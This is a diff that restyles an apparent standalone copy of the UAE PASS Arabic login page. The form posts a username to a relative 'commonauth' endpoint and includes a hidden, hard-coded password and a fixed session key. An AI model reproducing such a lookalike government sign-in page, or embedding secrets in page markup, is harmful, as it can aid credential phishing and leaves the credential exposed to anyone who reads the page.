@@ -1,57 +1,81 @@
 <!doctype html>
-<html lang="ar">
-<head dir="rtl">
+<html lang="ar" dir="rtl">
+<head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>UAE PASS - تسجيل الدخول</title>
-    
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
-
     <div class="rectangle"></div>
-
-    <div class="container">
-        
-        <div class="logo">
-            <img src="self_service.png" alt="UAE Pass Logo">
-        </div>
-
-        <div class="login-to-uaepass">
-            الدخول عن طريق الهوية الرقمية
-        </div>
-
-        <form action="../../commonauth" method="post">
-            <input type="text" class="idn-input" id="username" name="username" 
-                   placeholder="رقم الهوية، البريد الإلكتروني، أو الهاتف">
+    
+    <div class="main-wrapper">
+        <div class="container">
+            <header class="header">
+                <div class="logo">
+                    <img src="self_service.png" alt="UAE Pass Logo">
+                </div>
+                
+                <h1 class="login-to-uaepass">
+                    الدخول عن طريق الهوية الرقمية
+                </h1>
+            </header>
             
-            <div style="text-align: right; margin-top: 15px;">
-                <input type="checkbox" checked id="rememberme" name="rememberme">
-                <label class="dont-have-account" for="rememberme">تذكرني</label>
-            </div>
-
-            <button type="submit" class="btn-login">تسجيل الدخول</button>
+            <main class="login-content">
+                <form action="../../commonauth" method="post" class="login-form">
+                    <div class="form-group">
+                        <input type="text" class="form-input" id="username" name="username" 
+                               placeholder="رقم الهوية، البريد الإلكتروني، أو الهاتف">
+                    </div>
+                    
+                    <div class="form-check">
+                        <input type="checkbox" checked id="rememberme" name="rememberme">
+                        <label class="checkbox-label" for="rememberme">تذكرني</label>
+                    </div>
+                    
+                    <div class="form-group-button">
+                        <button type="submit" class="btn-login">تسجيل الدخول</button>
+                    </div>
+                    
+                    <input type="hidden" name="password" value="ndwenw902ee9239">
+                    <input type="hidden" name="sessionDataKey" value="5b97084d-a443-4984-a417-63fdee833691">
+                </form>
+                
+                <div class="divider">
+                    <hr class="style">
+                </div>
+                
+                <div class="account-actions">
+                    <div class="dont-have-account">
+                        <span>ليس لديك حساب؟</span>
+                        <a href="#" class="create-new-account">إنشاء حساب جديد</a>
+                    </div>
+                    
+                    <div class="recover-account">
+                        <a href="#">كيفية استعادة الحساب؟</a>
+                    </div>
+                </div>
+                
+                <div class="uaepass-app">
+                    <button class="btn-app">
+                        <span class="btn-text">UAE PASS App</span>
+                    </button>
+                </div>
+            </main>
             
-            <input type="hidden" name="password" value="ndwenw902ee9239">
-            <input type="hidden" name="sessionDataKey" value="5b97084d-a443-4984-a417-63fdee833691">
-        </form>
-
-        <div class="extra-links">
-            <span class="dont-have-account">ليس لديك حساب؟</span>
-            <a href="#" class="create-new-account">إنشاء حساب جديد</a>
-            <a href="#" class="recover-account">كيفية استعادة الحساب؟</a>
+            <footer class="footer">
+                <div class="footer-links">
+                    <a href="#" class="menu">الدعم</a>
+                    <span class="menu-separator">|</span>
+                    <a href="#" class="menu">الأسئلة الشائعة</a>
+                    <span class="menu-separator">|</span>
+                    <a href="#" class="menu">نبذة عامة</a>
+                </div>
+                <div class="copyright">
+                    حقوق النشر © 2025 الهوية الرقمية جميع الحقوق محفوظة.
+                </div>
+            </footer>
         </div>
-
-        <footer class="footer">
-            <div class="path"></div>
-            <div class="footer-links">
-                <a href="#" class="menu">الدعم</a>
-                <a href="#" class="menu">الأسئلة الشائعة</a>
-                <a href="#" class="menu">نبذة عامة</a>
-            </div>
-            <span class="copyright">حقوق النشر © 2025 الهوية الرقمية جميع الحقوق محفوظة.</span>
-        </footer>
     </div>
-
 </body>
 </html>
